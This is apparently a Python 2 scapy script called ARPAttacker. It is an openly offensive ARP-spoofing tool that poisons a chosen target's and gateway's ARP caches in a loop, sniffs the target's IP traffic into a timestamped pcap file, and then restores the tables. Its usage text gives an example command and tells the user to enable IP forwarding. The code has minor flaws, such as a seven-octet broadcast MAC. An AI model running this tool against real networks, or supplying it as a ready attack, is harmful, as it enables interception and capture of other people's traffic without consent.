from scapy.all import *
import os
import sys
import threading
import signal
import getopt
import datetime

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):

	print "[*] Restoring target..."
	send(ARP(op= 2, psrc= gateway_ip, pdst= target_ip, hwdst= "ff:ff:ff:ff:ff:ff:ff", hwsrc= gateway_mac), count= 5)
	send(ARP(op= 2, psrc= target_ip, pdst= gateway_ip, hwdst= "ff:ff:ff:ff:ff:ff:ff", hwsrc= target_mac), count= 5)

	#call main thread close the thread
	os.kill(os.getpid(),signal.SIGINT)

def get_mac(ip_address):

	responses,unanswered = srp(Ether(dst= "ff:ff:ff:ff:ff:ff")/ARP(pdst= ip_address), timeout= 2, retry=10)

	for s,r in responses:
		return r[Ether].src

	return None

def posion_target(gateway_ip, gateway_mac, target_ip, target_mac):

	posion_target = ARP()
	posion_target.op = 2
	posion_target.psrc = gateway_ip
	posion_target.pdst = target_ip
	posion_target.hwdst = target_mac

	posion_gateway = ARP()
	posion_gateway.op = 2
	posion_gateway.psrc = target_ip
	posion_gateway.pdst = gateway_ip
	posion_gateway.hwdst = gateway_mac

	print "[*] Beginning the ARP posion. [CTRL-C to stop]"

	while True:
		try:
			send(posion_target)
			send(posion_gateway)

			time.sleep(2)

		except KeyboardInterrupt:
			restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

	print "[*] ARP posion attack finshed."

	return

def usage():
	print "arp_attacker"
	print "How to use?"
	print "-i --interface : The interface you want to posion."
	print "-t --target    : The IP you want to attack."
	print "-g --gateway   : The gateway IP in the posion network."
	print "-p --packets   : The number of packet you want to sniff.Default :100.\n"
	print "example: sudo python ARPAttacker.py -i en0 -t 192.168.1.3 -g 192.168.1.1 -p 100"
	print "[*] Remember to set your forwarding mode first."
	print "[*] If your computer is MAC.You should need to run this command."
	print "[*] $:sudo sysctl -w net.inet.ip.forwarding=1"
	sys.exit(0)

if not len(sys.argv[1:]):
	usage()

try:
	opts,args = getopt.getopt(sys.argv[1:],"i:t:g:p:",["interface","target","gateway","packets"])
except getopt.GetoptError as err:
	print str(err)
	usage()

interface = ""
target_ip = ""
gateway_ip = ""
packet_count = 100

for o,a in opts:
	if o in ("-i","--interface"):
		interface = a
	elif o in ("-t","--target"):
		target_ip = a
	elif o in ("-g","--gateway"):
		gateway_ip = a
	elif o in ("-p","--packets"):
		packet_count = int(a)
	else:
		pass

gateway_mac = get_mac(gateway_ip)
target_mac = get_mac(target_ip)

conf.iface = interface
#close output
conf.verb = 0

print "[*] Setting up %s" % interface

if gateway_mac is None:
	print "[!!!] Failed to get gateway MAC. Exiting."
	sys.exit(0)
else:
	print "[*] Gateway %s is at %s" % (gateway_ip,gateway_mac)

if target_mac is None:
	print "[!!!] Failed to get target MAC. Exiting."
	sys.exit(0)
else:
	print "[*] Target %s is at %s" % (target_ip, target_mac)

posion_thread = threading.Thread(target = posion_target, args= (gateway_ip,gateway_mac,target_ip,target_mac))
posion_thread.start()

try:
	print "[*] Start sniffer for %d packets" % packet_count

	bpf_filter = "ip host %s " % target_ip

	packets = sniff(count= packet_count, filter= bpf_filter, iface= interface)
	t = datetime.datetime.now()
	packet_name = 'arp-%s-%s-%s-%s-%s.pcap' % (str(t.year),str(t.month),str(t.day),str(t.hour),str(t.minute))
	wrpcap(packet_name,packets)

	restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
except KeyboardInterrupt:
	restore_target(gateway_ip, gateway_mac, target_ip, target_mac)


